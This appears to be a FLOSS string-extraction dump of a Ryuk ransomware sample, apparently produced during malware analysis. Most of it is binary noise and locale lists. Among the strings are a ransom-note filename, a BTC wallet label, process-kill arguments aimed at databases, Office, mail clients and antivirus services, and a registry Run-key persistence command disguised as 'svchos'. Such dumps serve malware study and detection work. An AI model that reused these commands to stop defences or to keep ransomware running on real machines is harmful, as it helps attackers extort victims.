+30ca
+){LA
+IA}n
+<:%p
+BTC wallet:
+":"%
+2GtALl1>
+%r=-
+6!j'2
+& :8
+?>.(
+;;ML
+Q<>4
+(E!0
+"d!8
+>2 *z
+17jxE
+G,:>01
+t4'=:2'*|G)
+u$Ql
+=<w(
+T<9+
+:=<(
+A%'$
+}kOWI
+?<g6=
+?=@k9
+*s;'	
+D18M
+l*)p
+!'C\BD@,7X
+;X}P?+
+?l )b1	
+Q5> ?S6
+H,6&?
+=U0-$-!
+oc&=h;
+',<7P
+dy]9
+i	5r&
+a$<W>%
+?(>^Cc`f3
+8P!9
+6"<NE
+M'1h;<i
+d4?!A-z
+j)86G2' |
+3*5#
+%BxkIt6
+%BxkIt2
+d4?!A-z
+j)82@)2!}
+D:poY*H
+(=G3
+No system is safe
+">	=
+/95"
+/IM zoolz.exe /F
+/IM agntsvc.exe /F
+/IM dbeng50.exe /F
+/IM dbsnmp.exe /F
+/IM encsvc.exe /F
+/IM excel.exe /F
+/IM firefoxconfig.exe /F
+/IM infopath.exe /F
+/IM isqlplussvc.exe /F
+/IM msaccess.exe /F
+/IM msftesql.exe /F
+/IM mspub.exe /F
+/IM mydesktopqos.exe /F
+/IM mydesktopservice.exe /F
+/IM mysqld.exe /F
+/IM mysqld-nt.exe /F
+/IM mysqld-opt.exe /F
+/IM ocautoupds.exe /F
+/IM ocomm.exe /F
+/IM ocssd.exe /F
+/IM onenote.exe /F
+/IM oracle.exe /F
+/IM outlook.exe /F
+/IM powerpnt.exe /F
+/IM sqbcoreservice.exe /F
+/IM sqlagent.exe /F
+/IM sqlbrowser.exe /F
+/IM sqlservr.exe /F
+/IM sqlwriter.exe /F
+/IM steam.exe /F
+/IM synctime.exe /F
+/IM tbirdconfig.exe /F
+/IM thebat.exe /F
+/IM thebat64.exe /F
+/IM thunderbird.exe /F
+/IM visio.exe /F
+/IM winword.exe /F
+/IM wordpad.exe /F
+/IM xfssvccon.exe /F
+/IM tmlisten.exe /F
+/IM PccNTMon.exe /F
+/IM CNTAoSMgr.exe /F
+/IM Ntrtscan.exe /F
+/IM mbamtray.exe /F
+RSA1
+ZUKUx}"K
+4B	!
+-:I~
+6%I~
+%oP?
+?B(,
+g*SqM5'T2Xzf
+4_nyX
+ ,I"
+?iF7
+kBu&
+`iF<
+ ,I"
+?iF7
+kBu&
+`iF<
+g}Y`/
+=,I~
+5;T5Xzf
+?_>sI~
+>Dc'
+=,I~
+5;T4Xzf
+?_?sI~
+?t]aS
+3'I#
+4B)!
+qM<&
+`iF>
+g,SqM7(
+ ,T$
+?-d[
+3'I#
+4B)!
+qM<&
+`iF>
+g/SqM7(
+ ,TeRk
++\h,:
+4Bu/
+#_<sI~
+kBu$
+\h,:
+4Bu/
+#_=sI~
+kBu$
+lVjx$
+?B(,
+g.SqM5'T6Xzf
+4_/'
+5oP?
+?B(,
+g!SqM5'T9Xzf
+4_nyX
+ ,I"
+?iF7
+kBu&
+`iF<
+?=d[
+?%I~
+qM+i
+k>pg?
+&z*S
+2B9s5{L8(
+%B9s5{L8"
+{Lpi
+k>8(
+*cG{B9s5{L),
+3'I2X
+1Dc5
+6iF"Bu/I~
+B>s5{L8(
+;"I5X
+1/I5X
+2	/9C
+Hz-S
+pgCq
+?=I5X
+k>pg
+"	WC
+qM<iF B?s5{L
+;*I4X
+k>pg
+;=I4X
+cG3	<i
+*cG{B?s53
+!HtcI4X
+k>pg
+:oP-
+=Bu:I~
+k>pg
+0	z/S
+k>pg
+pgCq
+{Lpi
+k>pg
+?B<s5{L>:
+\h>,
+qM)iF7Bu8I6X
+k>pg
+:B=s5{L-+
+7B=s5
+!HtcI6X
+2	/9C
+Hz.S
+%B=s5{L- 
+)"d[
+?%I~
+qM+i
+k>pg?
+&z!S
+2B2s5{L8(
+%B2s5{L8"
+{Lpi
+k>8(
+*cG{B2s5{L),
+3'I9X
+1Dc5
+6iLa
+lTGg_
+2-3G3Q3
+4j4v4{4
+4?5h5
+62676D6
+6I7\7
+758H8[8g8w8
+8M9Z9
+:(:W:_:w:}:
+<:<{<
+='=1=N=
+=S>\>d>
+?!?0?:?P?Y?d?k?
+0(080H0X0a0
+0(1N1q1
+2D3l3%484
+4X5d5
+6$606>6`6p6u6z6
+6-72777v7{7
+8'8,818a8i8t8
+9):;:E:S:n:
+?8?F?M?U?n?
+304H4u4
+465j5
+6$6:6P6g6n6z6
+7%777D7V7^7h7q7
+8j8w8
+8+949`9i9q9
+9f:y:
+;\;t;
+;T<k<
+<-=?=u=z=
+>%>->8>>>I>O>]>
+?9?g?m?
+0*1[1
+4"4O4V4
+5#5=5F5S5]5
+7.8@8p8
+949g9z9
+=+=4>
+?%?6?;?P?
+3!3,3C3s3
+4A4T4
+6	7,7R7t7
+8/878s8
+9-9?9J9O9T9o9y9
+:%:A:L:Q:V:t:~:
+;D;h;
+<&<+<0<R<`<o<
+<T=n=
+> ><>C>Z>p>
+0H0Z0
+1H1Z1l1~1
+2 2A2S2e2w2
+9!9E9y9
+:!:E:`:k:
+:=;D;K;R;_;
+<"=+=C=U=
+2d3~3
+3 4;4H4V4d4o4
+6*7]7
+7@8q8
+=,>Y>
+0-020
+2)202F2\2i2n2|2
+353J3[3
+374S4r4
+4.5M5
+5?6v6
+7O8x8
+8F9t9
+<'<u<
+>Z>s>
+?h?r?
+?0(171V1n1
+1a2m2
+3*323O3_3k3z3~4
+4(5E5Y5d5
+7K8L9\9m9u9
+:!:c:
+:(;@;
+>E>O>j>
+]0|0
+2<3W3m3
+;/;5;
+1&2k2p2t2x2|2
+4D6W6u6
+618h8o8t8x8|8
+9 9$9(9,9
+$1,181<1@1D1H1T1X1\1p1t1x1
+3 3$3(3,3034383<3@3D3H3L3P3T3X3\3`3d3h3l3p3t3x3|3
+4 4$4(4,4044484<4@4D4H4L4P4T4X4\4`4d4h4l4p4t4x4|4
+4@;H;P;T;X;\;`;d;h;l;t;x;|;
+5 5$5(5,5054585<5@5D5H5L5P5T5X5\5`5d5h5l5p5t5x5|5
+6 6$6(6,6064686<6@6D6H6L6P6T6X6\6`6d6h6l6p6t6x6
+7(8,8084888<8@8D8H8L8P8T8X8\8`8d8h8l8p8t8L=T=\=d=l=t=|=
+>$>,>4><>D>L>T>\>d>l>t>|>
+?$?,?4?<?D?L?T?\?d?l?t?|?
+0$0,040<0D0L0T0\0d0l0t0|0
+1$1,141<1D1L1T1\1d1l1t1|1
+2$2,242<2D2L2T2\2d2l2t2|2
+3$3,343<3D3L3T3\3d3l3t3|3
+4$4,444<4D4L4T4\4d4h>p>x>
+? ?(?0?8?@?H?P?X?`?h?p?x?
+0 0(00080@0H0P0X0`0h0p0x0
+1 1(10181@1H1P1X1`1h1p1x1
+2 2(20282@2H2P2X2`2h2p2x2
+3 3(30383@3H3P3X3`3h3p3x3
+4 4(40484@4H4P4X4`4h4p4x4
+5 5(50585@5H5P5X5`5h5p5x5
+5z?~?
+9$9,949<9D9L9T9\9d9l9t9|9
+94;8;@;L?P?l?p?
+080X0x0
+181X1x1
+2 2@2`2
+$0X0
+1 1$1@1D1p6
+
+---------------------------------
+| FLOSS UTF-16LE STRINGS (1163) |
+---------------------------------
+@advapi32
+api-ms-win-core-fibers-l1-1-1
+api-ms-win-core-synch-l1-2-0
+kernel32
+mscoree.dll
+         (((((                  H
+Sunday
+Monday
+Tuesday
+Wednesday
+Thursday
+Friday
+Saturday
+January
+February
+March
+April
+June
+July
+August
+September
+October
+November
+December
+MM/dd/yy
+dddd, MMMM dd, yyyy
+HH:mm:ss
+en-US
+@ja-JP
+zh-CN
+ko-KR
+zh-TW
+@api-ms-win-appmodel-runtime-l1-1-1
+api-ms-win-core-datetime-l1-1-1
+api-ms-win-core-file-l2-1-1
+api-ms-win-core-localization-l1-2-1
+api-ms-win-core-localization-obsolete-l1-2-0
+api-ms-win-core-processthreads-l1-1-2
+api-ms-win-core-string-l1-1-0
+api-ms-win-core-sysinfo-l1-2-1
+api-ms-win-core-winrt-l1-1-0
+api-ms-win-core-xstate-l2-1-0
+api-ms-win-rtcore-ntuser-window-l1-1-0
+api-ms-win-security-systemfunctions-l1-1-0
+ext-ms-win-kernel32-package-current-l1-1-0
+ext-ms-win-ntuser-dialogbox-l1-1-0
+ext-ms-win-ntuser-windowstation-l1-1-0
+user32
+zh-CHS
+ar-SA
+bg-BG
+ca-ES
+cs-CZ
+da-DK
+de-DE
+el-GR
+fi-FI
+fr-FR
+he-IL
+hu-HU
+is-IS
+it-IT
+nl-NL
+nb-NO
+pl-PL
+pt-BR
+ro-RO
+ru-RU
+hr-HR
+sk-SK
+sq-AL
+sv-SE
+th-TH
+tr-TR
+ur-PK
+id-ID
+uk-UA
+be-BY
+sl-SI
+et-EE
+lv-LV
+lt-LT
+fa-IR
+vi-VN
+hy-AM
+az-AZ-Latn
+eu-ES
+mk-MK
+tn-ZA
+xh-ZA
+zu-ZA
+af-ZA
+ka-GE
+fo-FO
+hi-IN
+mt-MT
+se-NO
+ms-MY
+kk-KZ
+ky-KG
+sw-KE
+uz-UZ-Latn
+tt-RU
+bn-IN
+pa-IN
+gu-IN
+ta-IN
+te-IN
+kn-IN
+ml-IN
+mr-IN
+sa-IN
+mn-MN
+cy-GB
+gl-ES
+kok-IN
+syr-SY
+div-MV
+quz-BO
+ns-ZA
+mi-NZ
+ar-IQ
+de-CH
+en-GB
+es-MX
+fr-BE
+it-CH
+nl-BE
+nn-NO
+pt-PT
+sr-SP-Latn
+sv-FI
+az-AZ-Cyrl
+se-SE
+ms-BN
+uz-UZ-Cyrl
+quz-EC
+ar-EG
+zh-HK
+de-AT
+en-AU
+es-ES
+fr-CA
+sr-SP-Cyrl
+se-FI
+quz-PE
+ar-LY
+zh-SG
+de-LU
+en-CA
+es-GT
+fr-CH
+hr-BA
+smj-NO
+ar-DZ
+zh-MO
+de-LI
+en-NZ
+es-CR
+fr-LU
+bs-BA-Latn
+smj-SE
+ar-MA
+en-IE
+es-PA
+fr-MC
+sr-BA-Latn
+sma-NO
+ar-TN
+en-ZA
+es-DO
+sr-BA-Cyrl
+sma-SE
+ar-OM
+en-JM
+es-VE
+sms-FI
+ar-YE
+en-CB
+es-CO
+smn-FI
+ar-SY
+en-BZ
+es-PE
+ar-JO
+en-TT
+es-AR
+ar-LB
+en-ZW
+es-EC
+ar-KW
+en-PH
+es-CL
+ar-AE
+es-UY
+ar-BH
+es-PY
+ar-QA
+es-BO
+es-SV
+es-HN
+es-NI
+es-PR
+zh-CHT
+af-za
+ar-ae
+ar-bh
+ar-dz
+ar-eg
+ar-iq
+ar-jo
+ar-kw
+ar-lb
+ar-ly
+ar-ma
+ar-om
+ar-qa
+ar-sa
+ar-sy
+ar-tn
+ar-ye
+az-az-cyrl
+az-az-latn
+be-by
+bg-bg
+bn-in
+bs-ba-latn
+ca-es
+cs-cz
+cy-gb
+da-dk
+de-at
+de-ch
+de-de
+de-li
+de-lu
+div-mv
+el-gr
+en-au
+en-bz
+en-ca
+en-cb
+en-gb
+en-ie
+en-jm
+en-nz
+en-ph
+en-tt
+en-us
+en-za
+en-zw
+es-ar
+es-bo
+es-cl
+es-co
+es-cr
+es-do
+es-ec
+es-es
+es-gt
+es-hn
+es-mx
+es-ni
+es-pa
+es-pe
+es-pr
+es-py
+es-sv
+es-uy
+es-ve
+et-ee
+eu-es
+fa-ir
+fi-fi
+fo-fo
+fr-be
+fr-ca
+fr-ch
+fr-fr
+fr-lu
+fr-mc
+gl-es
+gu-in
+he-il
+hi-in
+hr-ba
+hr-hr
+hu-hu
+hy-am
+id-id
+is-is
+it-ch
+it-it
+ja-jp
+ka-ge
+kk-kz
+kn-in
+kok-in
+ko-kr
+ky-kg
+lt-lt
+lv-lv
+mi-nz
+mk-mk
+ml-in
+mn-mn
+mr-in
+ms-bn
+ms-my
+mt-mt
+nb-no
+nl-be
+nl-nl
+nn-no
+ns-za
+pa-in
+pl-pl
+pt-br
+pt-pt
+quz-bo
+quz-ec
+quz-pe
+ro-ro
+ru-ru
+sa-in
+se-fi
+se-no
+se-se
+sk-sk
+sl-si
+sma-no
+sma-se
+smj-no
+smj-se
+smn-fi
+sms-fi
+sq-al
+sr-ba-cyrl
+sr-ba-latn
+sr-sp-cyrl
+sr-sp-latn
+sv-fi
+sv-se
+sw-ke
+syr-sy
+ta-in
+te-in
+th-th
+tn-za
+tr-tr
+tt-ru
+uk-ua
+ur-pk
+uz-uz-cyrl
+uz-uz-latn
+vi-vn
+xh-za
+zh-chs
+zh-cht
+zh-cn
+zh-hk
+zh-mo
+zh-sg
+zh-tw
+zu-za
+CONOUT$
+\Documents and Settings\Default User\
+\users\Public\
+.exe
+advapi32
+api-ms-win-core-fibers-l1-1-1
+api-ms-win-core-synch-l1-2-0
+kernel32
+mscoree.dll
+(null)
+api-ms-win-appmodel-runtime-l1-1-1
+api-ms-win-core-datetime-l1-1-1
+api-ms-win-core-file-l2-1-1
+api-ms-win-core-localization-l1-2-1
+api-ms-win-core-localization-obsolete-l1-2-0
+api-ms-win-core-processthreads-l1-1-2
+api-ms-win-core-string-l1-1-0
+api-ms-win-core-sysinfo-l1-2-1
+api-ms-win-core-winrt-l1-1-0
+api-ms-win-core-xstate-l2-1-0
+api-ms-win-rtcore-ntuser-window-l1-1-0
+api-ms-win-security-systemfunctions-l1-1-0
+ext-ms-win-kernel32-package-current-l1-1-0
+ext-ms-win-ntuser-dialogbox-l1-1-0
+ext-ms-win-ntuser-windowstation-l1-1-0
+user32
+Sunday
+Monday
+Tuesday
+Wednesday
+Thursday
+Friday
+Saturday
+January
+February
+March
+April
+June
+July
+August
+September
+October
+November
+December
+MM/dd/yy
+dddd, MMMM dd, yyyy
+HH:mm:ss
+en-US
+ja-JP
+zh-CN
+ko-KR
+zh-TW
+         (((((                  H
+zh-CHS
+ar-SA
+bg-BG
+ca-ES
+cs-CZ
+da-DK
+de-DE
+el-GR
+fi-FI
+fr-FR
+he-IL
+hu-HU
+is-IS
+it-IT
+nl-NL
+nb-NO
+pl-PL
+pt-BR
+ro-RO
+ru-RU
+hr-HR
+sk-SK
+sq-AL
+sv-SE
+th-TH
+tr-TR
+ur-PK
+id-ID
+uk-UA
+be-BY
+sl-SI
+et-EE
+lv-LV
+lt-LT
+fa-IR
+vi-VN
+hy-AM
+az-AZ-Latn
+eu-ES
+mk-MK
+tn-ZA
+xh-ZA
+zu-ZA
+af-ZA
+ka-GE
+fo-FO
+hi-IN
+mt-MT
+se-NO
+ms-MY
+kk-KZ
+ky-KG
+sw-KE
+uz-UZ-Latn
+tt-RU
+bn-IN
+pa-IN
+gu-IN
+ta-IN
+te-IN
+kn-IN
+ml-IN
+mr-IN
+sa-IN
+mn-MN
+cy-GB
+gl-ES
+kok-IN
+syr-SY
+div-MV
+quz-BO
+ns-ZA
+mi-NZ
+ar-IQ
+de-CH
+en-GB
+es-MX
+fr-BE
+it-CH
+nl-BE
+nn-NO
+pt-PT
+sr-SP-Latn
+sv-FI
+az-AZ-Cyrl
+se-SE
+ms-BN
+uz-UZ-Cyrl
+quz-EC
+ar-EG
+zh-HK
+de-AT
+en-AU
+es-ES
+fr-CA
+sr-SP-Cyrl
+se-FI
+quz-PE
+ar-LY
+zh-SG
+de-LU
+en-CA
+es-GT
+fr-CH
+hr-BA
+smj-NO
+ar-DZ
+zh-MO
+de-LI
+en-NZ
+es-CR
+fr-LU
+bs-BA-Latn
+smj-SE
+ar-MA
+en-IE
+es-PA
+fr-MC
+sr-BA-Latn
+sma-NO
+ar-TN
+en-ZA
+es-DO
+sr-BA-Cyrl
+sma-SE
+ar-OM
+en-JM
+es-VE
+sms-FI
+ar-YE
+en-CB
+es-CO
+smn-FI
+ar-SY
+en-BZ
+es-PE
+ar-JO
+en-TT
+es-AR
+ar-LB
+en-ZW
+es-EC
+ar-KW
+en-PH
+es-CL
+ar-AE
+es-UY
+ar-BH
+es-PY
+ar-QA
+es-BO
+es-SV
+es-HN
+es-NI
+es-PR
+zh-CHT
+af-za
+ar-ae
+ar-bh
+ar-dz
+ar-eg
+ar-iq
+ar-jo
+ar-kw
+ar-lb
+ar-ly
+ar-ma
+ar-om
+ar-qa
+ar-sa
+ar-sy
+ar-tn
+ar-ye
+az-az-cyrl
+az-az-latn
+be-by
+bg-bg
+bn-in
+bs-ba-latn
+ca-es
+cs-cz
+cy-gb
+da-dk
+de-at
+de-ch
+de-de
+de-li
+de-lu
+div-mv
+el-gr
+en-au
+en-bz
+en-ca
+en-cb
+en-gb
+en-ie
+en-jm
+en-nz
+en-ph
+en-tt
+en-us
+en-za
+en-zw
+es-ar
+es-bo
+es-cl
+es-co
+es-cr
+es-do
+es-ec
+es-es
+es-gt
+es-hn
+es-mx
+es-ni
+es-pa
+es-pe
+es-pr
+es-py
+es-sv
+es-uy
+es-ve
+et-ee
+eu-es
+fa-ir
+fi-fi
+fo-fo
+fr-be
+fr-ca
+fr-ch
+fr-fr
+fr-lu
+fr-mc
+gl-es
+gu-in
+he-il
+hi-in
+hr-ba
+hr-hr
+hu-hu
+hy-am
+id-id
+is-is
+it-ch
+it-it
+ja-jp
+ka-ge
+kk-kz
+kn-in
+kok-in
+ko-kr
+ky-kg
+lt-lt
+lv-lv
+mi-nz
+mk-mk
+ml-in
+mn-mn
+mr-in
+ms-bn
+ms-my
+mt-mt
+nb-no
+nl-be
+nl-nl
+nn-no
+ns-za
+pa-in
+pl-pl
+pt-br
+pt-pt
+quz-bo
+quz-ec
+quz-pe
+ro-ro
+ru-ru
+sa-in
+se-fi
+se-no
+se-se
+sk-sk
+sl-si
+sma-no
+sma-se
+smj-no
+smj-se
+smn-fi
+sms-fi
+sq-al
+sr-ba-cyrl
+sr-ba-latn
+sr-sp-cyrl
+sr-sp-latn
+sv-fi
+sv-se
+sw-ke
+syr-sy
+ta-in
+te-in
+th-th
+tn-za
+tr-tr
+tt-ru
+uk-ua
+ur-pk
+uz-uz-cyrl
+uz-uz-latn
+vi-vn
+xh-za
+zh-chs
+zh-cht
+zh-cn
+zh-hk
+zh-mo
+zh-sg
+zh-tw
+zu-za
+CONOUT$
+\Documents and Settings\Default User\finish
+\users\Public\finish
+PUBLIC
+UNIQUE_ID_DO_NOT_REMOVE
+SeDebugPrivilege
+csrss.exe
+explorer.exe
+lsaas.exe
+\Documents and Settings\Default User\sys
+\users\Public\sys
+RyukReadMe.txt
+\System32\cmd.exe
+\Documents and Settings\Default User\
+\users\Public\
+\*.*
+/C REG ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "svchos" /t REG_SZ /d "
+" /f
+ /reg:64
+q'4!
+q2(&
+UNIQUE_ID_DO_NOT_REMOVE
+"B;'
+q1?=
+hrmlog
+q'4!
+q2(&
+?;Iy2(&
+"B;'
+q1?=
+5>G3
+advapi32
+api-ms-win-core-fibers-l1-1-1
+api-ms-win-core-synch-l1-2-0
+kernel32
+mscoree.dll
+(null)
+api-ms-win-appmodel-runtime-l1-1-1
+api-ms-win-core-datetime-l1-1-1
+api-ms-win-core-file-l2-1-1
+api-ms-win-core-localization-l1-2-1
+api-ms-win-core-localization-obsolete-l1-2-0
+api-ms-win-core-processthreads-l1-1-2
+api-ms-win-core-string-l1-1-0
+api-ms-win-core-sysinfo-l1-2-1
+api-ms-win-core-winrt-l1-1-0
+api-ms-win-core-xstate-l2-1-0
+api-ms-win-rtcore-ntuser-window-l1-1-0
+api-ms-win-security-systemfunctions-l1-1-0
+ext-ms-win-kernel32-package-current-l1-1-0
+ext-ms-win-ntuser-dialogbox-l1-1-0
+ext-ms-win-ntuser-windowstation-l1-1-0
+user32
+Sunday
+Monday
+Tuesday
+Wednesday
+Thursday
+Friday
+Saturday
+January
+February
+March
+April
+June
+July
+August
+September
+October
+November
+December
+MM/dd/yy
+dddd, MMMM dd, yyyy
+HH:mm:ss
+en-US
+ja-JP
+zh-CN
+ko-KR
+zh-TW
+         (((((                  H
+zh-CHS
+ar-SA
+bg-BG
+ca-ES
+cs-CZ
+da-DK
+de-DE
+el-GR
+fi-FI
+fr-FR
+he-IL
+hu-HU
+is-IS
+it-IT
+nl-NL
+nb-NO
+pl-PL
+pt-BR
+ro-RO
+ru-RU
+hr-HR
+sk-SK
+sq-AL
+sv-SE
+th-TH
+tr-TR
+ur-PK
+id-ID
+uk-UA
+be-BY
+sl-SI
+et-EE
+lv-LV
+lt-LT
+fa-IR
+vi-VN
+hy-AM
+az-AZ-Latn
+eu-ES
+mk-MK
+tn-ZA
+xh-ZA
+zu-ZA
+af-ZA
+ka-GE
+fo-FO
+hi-IN
+mt-MT
+se-NO
+ms-MY
+kk-KZ
+ky-KG
+sw-KE
+uz-UZ-Latn
+tt-RU
+bn-IN
+pa-IN
+gu-IN
+ta-IN
+te-IN
+kn-IN
+ml-IN
+mr-IN
+sa-IN
+mn-MN
+cy-GB
+gl-ES
+kok-IN
+syr-SY
+div-MV
+quz-BO
+ns-ZA
+mi-NZ
+ar-IQ
+de-CH
+en-GB
+es-MX
+fr-BE
+it-CH
+nl-BE
+nn-NO
+pt-PT
+sr-SP-Latn
+sv-FI
+az-AZ-Cyrl
+se-SE
+ms-BN
+uz-UZ-Cyrl
+quz-EC
+ar-EG
+zh-HK
+de-AT
+en-AU
+es-ES
+fr-CA
+sr-SP-Cyrl
+se-FI
+quz-PE
+ar-LY
+zh-SG
+de-LU
+en-CA
+es-GT
+fr-CH
+hr-BA
+smj-NO
+ar-DZ
+zh-MO
+de-LI
+en-NZ
+es-CR
+fr-LU
+bs-BA-Latn
+smj-SE
+ar-MA
+en-IE
+es-PA
+fr-MC
+sr-BA-Latn
+sma-NO
+ar-TN
+en-ZA
+es-DO
+sr-BA-Cyrl
+sma-SE
+ar-OM
+en-JM
+es-VE
+sms-FI
+ar-YE
+en-CB
+es-CO
+smn-FI
+ar-SY
+en-BZ
+es-PE
+ar-JO
+en-TT
+es-AR
+ar-LB
+en-ZW
+es-EC
+ar-KW
+en-PH
+es-CL
+ar-AE
+es-UY
+ar-BH
+es-PY
+ar-QA
+es-BO
+es-SV
+es-HN
+es-NI
+es-PR
+zh-CHT
+af-za
+ar-ae
+ar-bh
+ar-dz
+ar-eg
+ar-iq
+ar-jo
+ar-kw
+ar-lb
+ar-ly
+ar-ma
+ar-om
+ar-qa
+ar-sa
+ar-sy
+ar-tn
+ar-ye
+az-az-cyrl
+az-az-latn
+be-by
+bg-bg
+bn-in
+bs-ba-latn
+ca-es
+cs-cz
+cy-gb
+da-dk
+de-at
+de-ch
+de-de
+de-li
+de-lu
+div-mv
+el-gr
+en-au
+en-bz
+en-ca
+en-cb
+en-gb
+en-ie
+en-jm
+en-nz
+en-ph
+en-tt
+en-us
+en-za
+en-zw
+es-ar
+es-bo
+es-cl
+es-co
+es-cr
+es-do
+es-ec
+es-es
+es-gt
+es-hn
+es-mx
+es-ni
+es-pa
+es-pe
+es-pr
+es-py
+es-sv
+es-uy
+es-ve
+et-ee
+eu-es
+fa-ir
+fi-fi
+fo-fo
+fr-be
+fr-ca
+fr-ch
+fr-fr
+fr-lu
+fr-mc
+gl-es
+gu-in
+he-il
+hi-in
+hr-ba
+hr-hr
+hu-hu
+hy-am
+id-id
+is-is
+it-ch
+it-it
+ja-jp
+ka-ge
+kk-kz
+kn-in
+kok-in
+ko-kr
+ky-kg
+lt-lt
+lv-lv
+mi-nz
+mk-mk
+ml-in
+mn-mn
+mr-in
+ms-bn
+ms-my
+mt-mt
+nb-no
+nl-be
+nl-nl
+nn-no
+ns-za
+pa-in
+pl-pl
+pt-br
+pt-pt
+quz-bo
+quz-ec
+quz-pe
+ro-ro
+ru-ru
+sa-in
+se-fi
+se-no
+se-se
+sk-sk
+sl-si
+sma-no
+sma-se
+smj-no
+smj-se
+smn-fi
+sms-fi
+sq-al
+sr-ba-cyrl
+sr-ba-latn
+sr-sp-cyrl
+sr-sp-latn
+sv-fi
+sv-se
+sw-ke
+syr-sy
+ta-in
+te-in
+th-th
+tn-za
+tr-tr
+tt-ru
+uk-ua
+ur-pk
+uz-uz-cyrl
+uz-uz-latn
+vi-vn
+xh-za
+zh-chs
+zh-cht
+zh-cn
+zh-hk
+zh-mo
+zh-sg
+zh-tw
+zu-za
+CONOUT$
+\Documents and Settings\Default User\finish
+\users\Public\finish
+PUBLIC
+UNIQUE_ID_DO_NOT_REMOVE
+SeDebugPrivilege
+csrss.exe
+explorer.exe
+lsaas.exe
+\Documents and Settings\Default User\sys
+\users\Public\sys
+RyukReadMe.txt
+\System32\cmd.exe
+\Documents and Settings\Default User\
+\users\Public\
+\*.*
+/C REG ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "svchos" /t REG_SZ /d "
+" /f
+ /reg:64
+UNIQUE_ID_DO_NOT_REMOVE
+q'4!
+q2(&
+"B;'
+q1?=
+hrmlog
+q'4!
+q2(&
+?;Iy2(&
+"B;'
+q1?=
+5>G3
+
+---------------------------
+| FLOSS STACK STRINGS (0) |
+---------------------------
+
+---------------------------
+| FLOSS TIGHT STRINGS (0) |
+---------------------------
+
+-----------------------------
+| FLOSS DECODED STRINGS (2) |
+-----------------------------
+C:\Users\flare\program.exe
+\users\Public\
